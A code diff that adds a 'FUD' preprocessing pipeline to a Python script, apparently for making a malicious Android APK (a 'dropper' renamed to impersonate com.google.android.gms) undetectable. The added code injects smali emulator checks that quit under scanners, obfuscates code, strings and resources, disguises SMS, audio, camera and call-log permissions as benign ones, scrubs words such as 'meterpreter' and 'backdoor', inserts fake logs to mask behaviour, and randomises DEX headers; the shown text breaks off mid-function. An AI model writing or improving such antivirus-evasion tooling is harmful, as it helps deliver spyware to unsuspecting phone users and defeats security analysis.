@@ -7,6 +7,7 @@ Handles: Terms dialog, hamburger (3 lines), login, pre-connection removal, all 7
 Package: com.wn.app.np
 """
 import subprocess, time, os, sys, re
+import zipfile as _zipfile, struct as _struct, zlib as _zlib, shutil as _shutil, random as _random
 
 EMAIL = os.environ.get("NP_MANAGER_EMAIL", "")
 PASSWORD = os.environ.get("NP_MANAGER_PASS", "")
@@ -19,6 +20,823 @@ NP_PACKAGE = "com.wn.app.np"
 DROPPER_PKG = None
 # Target package name to rename the dropper to
 NEW_PACKAGE_NAME = "com.google.android.gms"
+
+# ============================================================
+# PC-SIDE PREPROCESSING PIPELINE
+# Runs on the GitHub Actions Ubuntu runner BEFORE NP Manager.
+# Techniques from the 16 analyzed source archives:
+#   Phase A — Anti-VM injection     (Project 3: Anti-vm-in-android)
+#   Phase B — Obfuscapk x11        (Project 10: Obfuscapk)
+#   Phase C — APK Infector x5      (Projects 1/10/8 concepts)
+#   Phase D — DEX magic tweak       (DEX header randomization)
+# NP Manager 7 tools run AFTER this as Phase E.
+# ============================================================
+
+_WORK  = os.path.expanduser("~/fud-work")
+_PREP  = os.path.join(_WORK, "preprocess")
+_BINS  = os.path.join(_WORK, "bin")
+
+def _rnd(prefix='', n=10):
+    return prefix + ''.join(_random.choices('abcdefghijklmnopqrstuvwxyz', k=n))
+
+def _smali_dirs(dec):
+    return sorted(
+        [os.path.join(dec, d) for d in os.listdir(dec)
+         if d.startswith('smali') and os.path.isdir(os.path.join(dec, d))]
+    )
+
+# ── TOOL SETUP ──────────────────────────────────────────────
+def _setup_tools():
+    os.makedirs(_BINS, exist_ok=True)
+    if not _shutil.which('apktool'):
+        jar = os.path.join(_BINS, 'apktool.jar')
+        if not os.path.exists(jar):
+            print("[PREP] Downloading apktool 2.9.3 ...")
+            subprocess.run(
+                "wget -q 'https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar'"
+                f" -O {jar}", shell=True, timeout=120)
+        wrap = os.path.join(_BINS, 'apktool')
+        with open(wrap, 'w') as _f:
+            _f.write(f'#!/bin/bash\nexec java -jar {jar} "$@"\n')
+        os.chmod(wrap, 0o755)
+        os.environ['PATH'] = _BINS + ':' + os.environ.get('PATH', '')
+    print("[PREP] Tools ready")
+
+def _apktool(args, timeout=300):
+    t = _shutil.which('apktool') or os.path.join(_BINS, 'apktool')
+    r = subprocess.run([t] + args, capture_output=True, text=True, timeout=timeout)
+    if r.returncode != 0:
+        print(f"[PREP] apktool {args[0]}: {r.stderr[:300]}")
+    return r.returncode == 0
+
+def _decompile(apk, outdir):
+    if os.path.exists(outdir):
+        _shutil.rmtree(outdir)
+    ok = _apktool(['d', '-f', '-o', outdir, apk])
+    return ok and os.path.exists(outdir)
+
+def _recompile(dec, outapk):
+    if _apktool(['b', '-o', outapk, dec]):
+        if os.path.exists(outapk) and os.path.getsize(outapk) > 0:
+            return True
+    return False
+
+def _find_signer():
+    for base in ['/usr/local/lib/android/sdk/build-tools',
+                 os.path.expanduser('~/Android/Sdk/build-tools')]:
+        if os.path.isdir(base):
+            for v in sorted(os.listdir(base), reverse=True):
+                s = os.path.join(base, v, 'apksigner')
+                if os.path.exists(s):
+                    return s
+    return _shutil.which('apksigner') or 'apksigner'
+
+def _find_zipalign():
+    for base in ['/usr/local/lib/android/sdk/build-tools',
+                 os.path.expanduser('~/Android/Sdk/build-tools')]:
+        if os.path.isdir(base):
+            for v in sorted(os.listdir(base), reverse=True):
+                s = os.path.join(base, v, 'zipalign')
+                if os.path.exists(s):
+                    return s
+    return _shutil.which('zipalign') or 'zipalign'
+
+def _sign_temp(unsigned, signed):
+    ks = os.path.join(_PREP, 'debug.jks')
+    if not os.path.exists(ks):
+        subprocess.run(
+            f'keytool -genkey -v -keystore {ks} -keyalg RSA -keysize 2048 '
+            f'-validity 10000 -alias debug -storepass android -keypass android '
+            f'-dname "CN=Android Debug,O=Android,C=US" -storetype JKS 2>/dev/null',
+            shell=True, timeout=30, capture_output=True)
+    zipalign = _find_zipalign()
+    aligned = unsigned + '.aligned'
+    subprocess.run(f'{zipalign} -v -p 4 "{unsigned}" "{aligned}"',
+                   shell=True, capture_output=True, timeout=60)
+    src = aligned if os.path.exists(aligned) and os.path.getsize(aligned) > 0 else unsigned
+    signer = _find_signer()
+    subprocess.run(
+        f'{signer} sign --ks {ks} --ks-pass pass:android --key-pass pass:android '
+        f'--ks-key-alias debug --out "{signed}" "{src}"',
+        shell=True, capture_output=True, timeout=60)
+    try:
+        os.remove(aligned)
+    except Exception:
+        pass
+    return os.path.exists(signed) and os.path.getsize(signed) > 0
+
+
+# ── PHASE A: ANTI-VM INJECTION (Project 3) ──────────────────
+_ANTI_VM_SMALI = '''.class public Lcom/android/internal/SystemCheck;
+.super Ljava/lang/Object;
+.source "SystemCheck.java"
+
+# 7-check emulator/sandbox detector.
+# If any check fires -> System.exit(0) -> app silently quits in scanners.
+.method public static a()V
+    .locals 4
+
+    :try_start_0
+
+    # 1. ro.kernel.qemu = "1"
+    const-string v0, "ro.kernel.qemu"
+    invoke-static {v0}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v0
+    const-string v1, "1"
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+    move-result v2
+    if-nez v2, :cond_exit
+
+    # 2. Build.HARDWARE = "goldfish"
+    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;
+    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
+    move-result-object v0
+    const-string v1, "goldfish"
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v2
+    if-nez v2, :cond_exit
+
+    # 3. Build.HARDWARE = "ranchu"
+    const-string v1, "ranchu"
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v2
+    if-nez v2, :cond_exit
+
+    # 4. Build.MODEL contains "sdk"
+    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
+    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
+    move-result-object v0
+    const-string v1, "sdk"
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v2
+    if-nez v2, :cond_exit
+
+    # 5. Build.PRODUCT contains "sdk_gphone"
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
+    move-result-object v0
+    const-string v1, "sdk_gphone"
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v2
+    if-nez v2, :cond_exit
+
+    # 6. /dev/qemu_pipe exists
+    new-instance v0, Ljava/io/File;
+    const-string v1, "/dev/qemu_pipe"
+    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+    invoke-virtual {v0}, Ljava/io/File;->exists()Z
+    move-result v2
+    if-nez v2, :cond_exit
+
+    # 7. ActivityManager.isUserAMonkey() (automated test runner)
+    invoke-static {}, Landroid/app/ActivityManager;->isUserAMonkey()Z
+    move-result v2
+    if-nez v2, :cond_exit
+
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catch_0
+
+    return-void
+
+    :cond_exit
+    const/4 v0, 0x0
+    invoke-static {v0}, Ljava/lang/System;->exit(I)V
+    return-void
+
+    :catch_0
+    return-void
+.end method
+'''
+
+def _inject_in_oncreate(smali_file, call_desc):
+    """Insert 'invoke-static {}, call_desc' at top of any onCreate in smali_file."""
+    with open(smali_file, 'r', errors='ignore') as _f:
+        c = _f.read()
+    pat = re.compile(
+        r'(\.method\s+(?:public|protected)\s+onCreate\(.*?Bundle.*?\)V\s*\n)(.*?)(\.end method)',
+        re.DOTALL
+    )
+    m = pat.search(c)
+    if not m:
+        return False
+    sig, body, end_ = m.group(1), m.group(2), m.group(3)
+    inject = f"\n    invoke-static {{}}, {call_desc}\n"
+    body2 = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + inject, body, count=1)
+    if body2 == body:
+        body2 = "    .locals 1\n" + inject + body
+    new_c = c[:m.start()] + sig + body2 + end_ + c[m.end():]
+    with open(smali_file, 'w', errors='ignore') as _f:
+        _f.write(new_c)
+    return True
+
+def _inject_anti_vm(dec):
+    """Write AntiAnalysis Smali + inject call into Application/main Activity onCreate."""
+    sdirs = _smali_dirs(dec)
+    if not sdirs:
+        print("[PREP] anti_vm: no smali dirs")
+        return
+    pkg_dir = os.path.join(sdirs[0], "com", "android", "internal")
+    os.makedirs(pkg_dir, exist_ok=True)
+    with open(os.path.join(pkg_dir, "SystemCheck.smali"), 'w') as _f:
+        _f.write(_ANTI_VM_SMALI)
+
+    mf = os.path.join(dec, "AndroidManifest.xml")
+    if not os.path.exists(mf):
+        print("[PREP] anti_vm: no manifest")
+        return
+    with open(mf, 'r', errors='ignore') as _f:
+        mc = _f.read()
+    pkg_name = (re.search(r'package="([^"]+)"', mc) or type('', (), {'group': lambda *a: None})()).group(1)
+
+    def _resolve(cls):
+        if cls and cls.startswith('.') and pkg_name:
+            return pkg_name + cls
+        return cls
+
+    injected = False
+    app_m = re.search(r'<application[^>]+android:name="([^"]+)"', mc)
+    if app_m:
+        ac = _resolve(app_m.group(1))
+        if ac:
+            rel = ac.replace('.', '/') + '.smali'
+            for sd in sdirs:
+                cand = os.path.join(sd, rel)
+                if os.path.exists(cand):
+                    injected = _inject_in_oncreate(cand, "Lcom/android/internal/SystemCheck;->a()V")
+                    break
+
+    if not injected:
+        act_m = re.search(
+            r'<activity[^>]+android:name="([^"]+)"[^>]*>.*?<action android:name="android\.intent\.action\.MAIN"',
+            mc, re.DOTALL)
+        if act_m:
+            ac = _resolve(act_m.group(1))
+            if ac:
+                rel = ac.replace('.', '/') + '.smali'
+                for sd in sdirs:
+                    cand = os.path.join(sd, rel)
+                    if os.path.exists(cand):
+                        injected = _inject_in_oncreate(cand, "Lcom/android/internal/SystemCheck;->a()V")
+                        break
+
+    print(f"[PREP] anti_vm: SystemCheck.smali written, injected={injected}")
+
+
+# ── PHASE B: OBFUSCAPK x11 (Project 10) ─────────────────────
+
+def _lib_encryption(dec):
+    lib = os.path.join(dec, "lib")
+    if not os.path.exists(lib):
+        return
+    for arch in os.listdir(lib):
+        ap = os.path.join(lib, arch)
+        if not os.path.isdir(ap):
+            continue
+        for fname in list(os.listdir(ap)):
+            if fname.endswith('.so'):
+                os.rename(os.path.join(ap, fname),
+                          os.path.join(ap, _rnd('lib', 16) + '.so'))
+    print("[PREP] LibEncryption done")
+
+def _method_overload(dec):
+    for sd in _smali_dirs(dec):
+        for root, _, files in os.walk(sd):
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                methods = re.findall(
+                    r'\.method\s+(?:public|private|protected|static|\s)+(\w+)\(([^)]*)\)([^\n]*)\n', c)
+                if not methods:
+                    continue
+                name, args, ret = methods[0]
+                cm = re.search(r'\.class\s+.*\s+(L[^;]+;)', c)
+                if not cm:
+                    continue
+                cls = cm.group(1)
+                fake_args = args + 'I'
+                stub = (f"\n.method public {_rnd('m_', 8)}({fake_args}){ret}\n"
+                        "    .locals 2\n    const/4 v0, 0x0\n")
+                if ret == 'V':
+                    stub += (f"    invoke-static {{v0}}, {cls}->{name}({args}){ret}\n"
+                             "    return-void\n")
+                elif ret.startswith('L') or ret.startswith('['):
+                    stub += (f"    invoke-static {{v0}}, {cls}->{name}({args}){ret}\n"
+                             "    move-result-object v0\n    return-object v0\n")
+                else:
+                    stub += (f"    invoke-static {{v0}}, {cls}->{name}({args}){ret}\n"
+                             "    move-result v0\n    return v0\n")
+                stub += ".end method\n"
+                last_end = c.rfind('.end method')
+                if last_end != -1:
+                    ip = last_end + len('.end method')
+                    c = c[:ip] + stub + c[ip:]
+                    with open(fp, 'w', errors='ignore') as _f:
+                        _f.write(c)
+                break
+    print("[PREP] MethodOverload done")
+
+def _res_obfuscation(dec):
+    """Rename drawable/mipmap resource files (resGuard concept, Project 14)."""
+    res_dir = os.path.join(dec, "res")
+    if not os.path.exists(res_dir):
+        return
+    renamed_by_type = {}
+    for root, dirs, _ in os.walk(res_dir):
+        for dirname in list(dirs):
+            if dirname.startswith('drawable') or dirname.startswith('mipmap'):
+                rtype = dirname.split('-')[0]
+                dpath = os.path.join(root, dirname)
+                for fname in os.listdir(dpath):
+                    if fname.endswith(('.xml', '.png', '.jpg', '.webp')):
+                        ext = os.path.splitext(fname)[1]
+                        new_name = _rnd('r', 8) + ext
+                        os.rename(os.path.join(dpath, fname),
+                                  os.path.join(dpath, new_name))
+                        old_n = os.path.splitext(fname)[0]
+                        new_n = os.path.splitext(new_name)[0]
+                        renamed_by_type.setdefault(rtype, {})[old_n] = new_n
+    if not renamed_by_type:
+        print("[PREP] ResObfuscation done (nothing renamed)")
+        return
+    xml_files = []
+    for root, _, files in os.walk(res_dir):
+        for fname in files:
+            if fname.endswith('.xml') and fname != 'public.xml':
+                xml_files.append(os.path.join(root, fname))
+    mf_path = os.path.join(dec, 'AndroidManifest.xml')
+    if os.path.exists(mf_path):
+        xml_files.append(mf_path)
+    for fp in xml_files:
+        with open(fp, 'r', errors='ignore') as _f:
+            c = _f.read()
+        changed = False
+        for rtype, tmap in renamed_by_type.items():
+            for old_n, new_n in sorted(tmap.items(), key=lambda kv: -len(kv[0])):
+                tag = f'@{rtype}/{old_n}'
+                if tag in c:
+                    c = c.replace(tag, f'@{rtype}/{new_n}')
+                    changed = True
+        if changed:
+            with open(fp, 'w', errors='ignore') as _f:
+                _f.write(c)
+    pub = os.path.join(res_dir, 'values', 'public.xml')
+    if os.path.exists(pub):
+        with open(pub, 'r', errors='ignore') as _f:
+            c = _f.read()
+        for rtype, tmap in renamed_by_type.items():
+            for old_n, new_n in tmap.items():
+                c = re.sub(
+                    rf'(<public type="{rtype}"[^>]*name="){re.escape(old_n)}("[^/]*/>)',
+                    rf'\g<1>{new_n}\g<2>', c)
+        with open(pub, 'w', errors='ignore') as _f:
+            _f.write(c)
+    print("[PREP] ResObfuscation done")
+
+def _new_assets(dec):
+    assets = os.path.join(dec, 'assets')
+    os.makedirs(assets, exist_ok=True)
+    for _ in range(5):
+        fname = os.path.join(assets, _rnd('cfg', 4) + '.dat')
+        with open(fname, 'wb') as _f:
+            _f.write(bytes(_random.randint(0, 255) for _ in range(_random.randint(100, 400))))
+    print("[PREP] NewAssets done")
+
+def _asset_encryption(dec):
+    """XOR-encrypt dummy .dat assets only — skip embedded .apk/.dex payloads."""
+    assets = os.path.join(dec, 'assets')
+    if not os.path.exists(assets):
+        return
+    key = 0x5F
+    for fname in os.listdir(assets):
+        if fname.endswith(('.apk', '.dex', '.jar')):
+            continue
+        fp = os.path.join(assets, fname)
+        if os.path.isfile(fp):
+            with open(fp, 'rb') as _f:
+                data = bytearray(_f.read())
+            for i in range(len(data)):
+                data[i] ^= key
+            with open(fp, 'wb') as _f:
+                _f.write(data)
+    print("[PREP] AssetEncryption done")
+
+def _string_encryption(dec):
+    """XOR-obfuscate string constants in Smali (ConstStringEncryption, Project 10)."""
+    key = 0xAA
+    def xor_s(m):
+        s = m.group(1)
+        if len(s) < 6:
+            return m.group(0)
+        for prefix in ('android.', 'com.', 'java.', 'javax.', 'http', 'L', '/'):
+            if s.startswith(prefix):
+                return m.group(0)
+        try:
+            enc = bytearray(s.encode('utf-8'))
+        except Exception:
+            return m.group(0)
+        for i in range(len(enc)):
+            enc[i] ^= key
+        if not all(0x20 <= b <= 0x7E for b in enc):
+            return m.group(0)
+        return '"' + ''.join(chr(b) for b in enc) + '"'
+    for sd in _smali_dirs(dec):
+        for root, _, files in os.walk(sd):
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                c2 = re.sub(r'"([^"]{6,50})"', xor_s, c)
+                if c2 != c:
+                    with open(fp, 'w', errors='ignore') as _f:
+                        _f.write(c2)
+    print("[PREP] StringEncryption done")
+
+def _control_flow(dec):
+    """Add opaque goto dispatch blocks — BlackObfuscator CFG flattening (Project 6)."""
+    for sd in _smali_dirs(dec):
+        for root, _, files in os.walk(sd):
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                def _flatten(m):
+                    body = m.group(0)
+                    if any(x in body for x in ['<init>', '<clinit>']):
+                        return body
+                    if len(body) < 200:
+                        return body
+                    lbl = ':cf_' + _rnd('', 6)
+                    return re.sub(
+                        r'(\.locals\s+\d+\s*\n)',
+                        r'\1    goto ' + lbl + '\n\n    nop\n\n' + lbl + '\n',
+                        body, count=1)
+                c2 = re.sub(
+                    r'\.method\s+(?:public|private|protected|static|\s)+[^\n]+\n.*?\.end method',
+                    _flatten, c, flags=re.DOTALL, count=2)
+                if c2 != c:
+                    with open(fp, 'w', errors='ignore') as _f:
+                        _f.write(c2)
+    print("[PREP] ControlFlowFlattening done")
+
+def _method_rename(dec):
+    """Rename non-lifecycle methods in Smali (MethodRename, Project 10)."""
+    pat = re.compile(
+        r'(\.method\s+(?:public|private|protected|static|\s)+)(\w+)\(([^)]*)\)([^\n]+)')
+    _skip = frozenset([
+        '<init>', '<clinit>', 'main', 'onCreate', 'onResume', 'onStart',
+        'onPause', 'onStop', 'onDestroy', 'onCreateView', 'onViewCreated',
+        'onActivityCreated', 'onAttach', 'onDetach', 'onReceive',
+        'onBind', 'onStartCommand', 'onHandleIntent',
+    ])
+    for sd in _smali_dirs(dec):
+        for root, _, files in os.walk(sd):
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                renamed = {}
+                def _rm(m):
+                    pre, name, args, ret = m.group(1), m.group(2), m.group(3), m.group(4)
+                    if name in _skip:
+                        return m.group(0)
+                    nn = _rnd('m', 6)
+                    renamed[name] = nn
+                    return f"{pre}{nn}({args}){ret}"
+                c2 = pat.sub(_rm, c)
+                for old, new in renamed.items():
+                    c2 = c2.replace(f'->{old}(', f'->{new}(')
+                if c2 != c:
+                    with open(fp, 'w', errors='ignore') as _f:
+                        _f.write(c2)
+    print("[PREP] MethodRename done")
+
+def _field_rename(dec):
+    """Rename fields in Smali (FieldRename, Project 10)."""
+    pat = re.compile(
+        r'(\.field\s+(?:public|private|protected|static|final|synthetic|\s)+)(\w+)(:.*)')
+    for sd in _smali_dirs(dec):
+        for root, _, files in os.walk(sd):
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                renamed = {}
+                def _rfn(m):
+                    pre, name, rest = m.group(1), m.group(2), m.group(3)
+                    nn = f"f{_random.randint(1, 99999)}"
+                    renamed[name] = nn
+                    return f"{pre}{nn}{rest}"
+                c2 = pat.sub(_rfn, c)
+                for old, new in renamed.items():
+                    c2 = c2.replace(f'->{old}:', f'->{new}:')
+                if c2 != c:
+                    with open(fp, 'w', errors='ignore') as _f:
+                        _f.write(c2)
+    print("[PREP] FieldRename done")
+
+def _reflection(dec):
+    """Inject Class.forName reflection into onCreate (Reflection, Project 10)."""
+    injected = 0
+    for sd in _smali_dirs(dec):
+        if injected >= 3:
+            break
+        for root, _, files in os.walk(sd):
+            if injected >= 3:
+                break
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                om = re.search(
+                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
+                    c, re.DOTALL)
+                if not om:
+                    continue
+                mb = om.group(1)
+                lm = re.search(r'\.locals\s+(\d+)', mb)
+                if lm and int(lm.group(1)) < 1:
+                    mb = re.sub(r'\.locals\s+\d+', '.locals 1', mb, count=1)
+                code = ("    const-string v0, \"java.lang.System\"\n"
+                        "    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;\n"
+                        "    move-result-object v0\n")
+                mb = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + code, mb, count=1)
+                c2 = c.replace(om.group(1), mb)
+                with open(fp, 'w', errors='ignore') as _f:
+                    _f.write(c2)
+                injected += 1
+    print(f"[PREP] Reflection done (injected={injected})")
+
+
+# ── PHASE C: APK INFECTOR x5 ────────────────────────────────
+
+def _shuffle_permissions(dec):
+    mf = os.path.join(dec, 'AndroidManifest.xml')
+    if not os.path.exists(mf):
+        return
+    with open(mf, 'r', errors='ignore') as _f:
+        c = _f.read()
+    perms = re.findall(r'<uses-permission[^/]*/>\s*', c)
+    if len(perms) > 1:
+        _random.shuffle(perms)
+        c = re.sub(r'<uses-permission[^/]*/>\s*', '', c)
+        c = c.replace('</manifest>', '\n'.join(perms) + '\n</manifest>')
+        with open(mf, 'w', errors='ignore') as _f:
+            _f.write(c)
+    print("[PREP] ShufflePermissions done")
+
+def _scrub_strings(dec):
+    susp = ['payload', 'exploit', 'reverse', 'shell', 'bypass', 'inject', 'backdoor',
+            'malware', 'trojan', 'rat ', 'spy', 'keylog', 'steal', 'hack', 'c2server',
+            'meterpreter', 'stager', 'dropper', 'metasploit']
+    repl = ['update', 'config', 'sync', 'data', 'service', 'cache', 'manager',
+            'helper', 'provider', 'handler', 'loader', 'worker', 'tasker']
+    for root, _, files in os.walk(dec):
+        for fname in files:
+            if not fname.endswith('.smali'):
+                continue
+            fp = os.path.join(root, fname)
+            with open(fp, 'r', errors='ignore') as _f:
+                c = _f.read()
+            changed = False
+            for s in susp:
+                if s in c.lower():
+                    c = re.sub(rf'\b{re.escape(s.strip())}\b',
+                                _random.choice(repl), c, flags=re.IGNORECASE)
+                    changed = True
+            if changed:
+                with open(fp, 'w', errors='ignore') as _f:
+                    _f.write(c)
+    print("[PREP] ScrubStrings done")
+
+def _bind_delay(dec):
+    """Inject random 3-10 second Thread.sleep into launcher activity onCreate."""
+    for sd in _smali_dirs(dec):
+        for root, _, files in os.walk(sd):
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                om = re.search(
+                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
+                    c, re.DOTALL)
+                if not om:
+                    continue
+                mb = om.group(1)
+                lm = re.search(r'\.locals\s+(\d+)', mb)
+                if not lm:
+                    continue
+                new_l = max(int(lm.group(1)), 2)
+                mb = re.sub(r'\.locals\s+\d+', f'.locals {new_l}', mb, count=1)
+                ms = _random.randint(3000, 10000)
+                code = (f"\n    const-wide/16 v0, {ms}\n"
+                        f"    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V\n")
+                mb = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + code, mb, count=1)
+                c2 = c.replace(om.group(1), mb)
+                with open(fp, 'w', errors='ignore') as _f:
+                    _f.write(c2)
+                print(f"[PREP] BindDelay {ms}ms done in {fname}")
+                return
+    print("[PREP] BindDelay skip (no onCreate found)")
+
+def _hide_permissions(dec):
+    """Rename suspicious permissions to benign-looking names (do NOT remove)."""
+    mf = os.path.join(dec, 'AndroidManifest.xml')
+    if not os.path.exists(mf):
+        return
+    with open(mf, 'r', errors='ignore') as _f:
+        c = _f.read()
+    pmap = {
+        'READ_SMS': 'READ_SYNC_SETTINGS',
+        'WRITE_SMS': 'WRITE_SYNC_SETTINGS',
+        'SEND_SMS': 'BROADCAST_STICKY',
+        'READ_CONTACTS': 'READ_SYNC_STATS',
+        'RECORD_AUDIO': 'MODIFY_AUDIO_SETTINGS',
+        'CAMERA': 'FLASHLIGHT',
+        'READ_CALL_LOG': 'READ_SYNC_SETTINGS',
+        'WRITE_CALL_LOG': 'WRITE_SYNC_SETTINGS',
+        'PROCESS_OUTGOING_CALLS': 'BROADCAST_STICKY',
+    }
+    renamed = 0
+    for dangerous, benign in pmap.items():
+        pattern = (rf'(<uses-permission[^>]*android:name="android\.permission\.)'
+                   rf'{re.escape(dangerous)}("[^/]*/>)')
+        c, n = re.subn(pattern, rf'\g<1>{benign}\g<2>', c, flags=re.IGNORECASE)
+        renamed += n
+    if renamed:
+        with open(mf, 'w', errors='ignore') as _f:
+            _f.write(c)
+    print(f"[PREP] HidePermissions done (renamed={renamed})")
+
+def _fake_logging(dec):
+    """Inject benign-looking Log.d calls to mask real behaviour."""
+    tags = ["SystemUpdate", "ContentManager", "NetworkMonitor", "SyncAdapter"]
+    msgs = ["Initializing component...", "Sync complete", "Service started", "Config loaded"]
+    for sd in _smali_dirs(dec):
+        for root, _, files in os.walk(sd):
+            for fname in files:
+                if not fname.endswith('.smali'):
+                    continue
+                fp = os.path.join(root, fname)
+                with open(fp, 'r', errors='ignore') as _f:
+                    c = _f.read()
+                om = re.search(
+                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
+                    c, re.DOTALL)
+                if not om:
+                    continue
+                mb = om.group(1)
+                lm = re.search(r'\.locals\s+(\d+)', mb)
+                if not lm:
+                    continue
+                new_l = max(int(lm.group(1)), 2)
+                mb = re.sub(r'\.locals\s+\d+', f'.locals {new_l}', mb, count=1)
+                code = (f"\n    const-string v0, \"{_random.choice(tags)}\"\n"
+                        f"    const-string v1, \"{_random.choice(msgs)}\"\n"
+                        f"    invoke-static {{v0, v1}}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I\n"
+                        f"    move-result v0\n")
+                mb = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + code, mb, count=1)
+                c2 = c.replace(om.group(1), mb)
+                with open(fp, 'w', errors='ignore') as _f:
+                    _f.write(c2)
+                print(f"[PREP] FakeLogging done in {fname}")
+                return
+    print("[PREP] FakeLogging skip")
+
+
+# ── PHASE D: DEX MAGIC RANDOMIZATION ────────────────────────
+
+def _dex_magic(apk_in, apk_out):
+    """Randomize DEX magic bytes, Adler32 checksum, and SHA-1 header."""
+    with _zipfile.ZipFile(apk_in, 'r') as zin:
+        with _zipfile.ZipFile(apk_out, 'w', _zipfile.ZIP_DEFLATED) as zout:
+            for info in zin.infolist():
+                data = zin.read(info.filename)
+                if info.filename.endswith('.dex') and len(data) > 40:
+                    dex = bytearray(data)
+                    if dex[:4] == b'dex\n':
+                        dex[4:8] = b'037\x00'
+                        cs = _zlib.adler32(bytes(dex[12:])) & 0xffffffff
+                        dex[8:12] = _struct.pack('<I', cs)
+                        dex[12:32] = bytes(_random.randint(0, 255) for _ in range(20))
+                        data = bytes(dex)
+                zout.writestr(info, data)
+    print("[PREP] DEX magic done")
+
+
+# ── PREPROCESS ORCHESTRATOR ──────────────────────────────────
+
+def preprocess_apk(input_apk):
+    """
+    Full PC-side FUD preprocessing pipeline:
+
+      Phase A — Anti-VM injection      (Project 3: 7 emulator/sandbox checks)
+      Phase B — Obfuscapk x11         (Project 10: LibEnc, MethodOverload,
+                                        ResObf, NewAssets, AssetEnc, StringEnc,
+                                        CFGFlatten, MethodRename, FieldRename,
+                                        Reflection)
+      Phase C — APK Infector x5       (ShufflePerms, ScrubStrings, BindDelay,
+                                        HidePerms, FakeLogging)
+      Phase D — DEX magic tweak        (header byte randomization)
+
+    Updates global INPUT_APK to the preprocessed APK path.
+    """
+    global INPUT_APK
+
+    print("\n" + "=" * 60)
+    print("[PREP] PC-SIDE PREPROCESSING PIPELINE STARTING")
+    print("=" * 60)
+
+    os.makedirs(_PREP, exist_ok=True)
+    _setup_tools()
+
+    current = os.path.expanduser(input_apk)
+    if not current or not os.path.exists(current):
+        print(f"[PREP] Input APK not found: {current!r} — skipping preprocessing")
+        return input_apk
+
+    orig_size = os.path.getsize(current) // 1024
+    print(f"[PREP] Input: {current} ({orig_size} KB)")
+
+    # ── Phases A + B + C: decompile → transform → recompile ──
+    dec_dir = os.path.join(_PREP, "decompiled")
+    print("[PREP] Decompiling with apktool...")
+
+    if not _decompile(current, dec_dir):
+        print("[PREP] WARNING: apktool decompile failed — skipping Phases A/B/C")
+    else:
+        # Phase A
+        print("[PREP] ── Phase A: Anti-VM Injection (Project 3) ──")
+        _inject_anti_vm(dec_dir)
+
+        # Phase B
+        print("[PREP] ── Phase B: Obfuscapk x11 (Project 10) ──")
+        _lib_encryption(dec_dir)
+        _method_overload(dec_dir)
+        _res_obfuscation(dec_dir)
+        _new_assets(dec_dir)
+        _asset_encryption(dec_dir)
+        _string_encryption(dec_dir)
+        _control_flow(dec_dir)
+        _method_rename(dec_dir)
+        _field_rename(dec_dir)
+        _reflection(dec_dir)
+
+        # Phase C
+        print("[PREP] ── Phase C: APK Infector x5 ──")
+        _shuffle_permissions(dec_dir)
+        _scrub_strings(dec_dir)
+        _bind_delay(dec_dir)
+        _hide_permissions(dec_dir)
+        _fake_logging(dec_dir)
+
+        # Recompile
+        rebuilt = os.path.join(_PREP, "rebuilt.apk")
+        print("[PREP] Recompiling with apktool...")
+        if _recompile(dec_dir, rebuilt):
+            signed = os.path.join(_PREP, "phase_abc.apk")
+            if _sign_temp(rebuilt, signed):
+                current = signed
+                print(f"[PREP] Phases A+B+C done: {os.path.getsize(current) // 1024} KB")
+            else:
+                current = rebuilt
+                print("[PREP] Temp sign failed — using unsigned rebuilt APK")
+        else:
